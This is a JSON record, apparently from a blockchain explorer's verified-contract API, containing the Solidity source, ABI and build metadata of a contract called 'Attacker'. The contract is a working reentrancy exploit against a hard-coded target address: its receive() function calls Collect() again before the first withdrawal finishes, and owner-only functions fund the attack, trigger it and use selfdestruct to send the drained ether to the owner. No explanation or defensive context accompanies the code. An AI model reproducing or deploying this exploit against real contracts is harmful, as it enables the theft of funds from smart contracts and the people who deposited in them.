{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity 0.8.0;\r\n\r\ninterface VulnerableContract {\r\n    function Collect(uint _am) external;\r\n}\r\n\r\ncontract Attacker\r\n{\r\n    address constant VULNERABLE_ADDRESS = address(0x084D3Fb3ED6bBeC95C305B546e6e01Dac23ba832);\r\n    address constant OWNER_ADDRESS = address(0xed749FD214F96B7B8D6279E93a34e092b73F63a1);\r\n    \r\n    bool public isReentered;\r\n    \r\n    receive() external payable {\r\n        if (msg.sender == VULNERABLE_ADDRESS && !isReentered) {\r\n            isReentered = true;\r\n            VulnerableContract vc = VulnerableContract(VULNERABLE_ADDRESS);\r\n            vc.Collect(1000000000000000000);\r\n        }\r\n    }\r\n    \r\n    function allowReenter() external {\r\n        if (msg.sender == OWNER_ADDRESS) {\r\n            isReentered = false;\r\n        }\r\n    }\r\n    \r\n    function startCollecting() external {\r\n        if (msg.sender == OWNER_ADDRESS) {\r\n            VulnerableContract vc = VulnerableContract(VULNERABLE_ADDRESS);\r\n            vc.Collect(1 ether);\r\n        }\r\n    }\r\n    \r\n    function put() external {\r\n        if (msg.sender == OWNER_ADDRESS) {\r\n            payable(VULNERABLE_ADDRESS).call{value: 1000000000000000000, gas: 400000}(\"\");\r\n        }\r\n    }\r\n    \r\n    function kill() public {\r\n        if (msg.sender == OWNER_ADDRESS) {\r\n            selfdestruct(payable(OWNER_ADDRESS));\r\n        }\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"name\":\"allowReenter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReentered\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"put\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startCollecting\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"Attacker","CompilerVersion":"v0.8.0+commit.c7dfd78e","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"ipfs://14a08930cc2951cd6c0d20021abec5010f53c507d4b15e8e5fe40d0eceaef377"}]}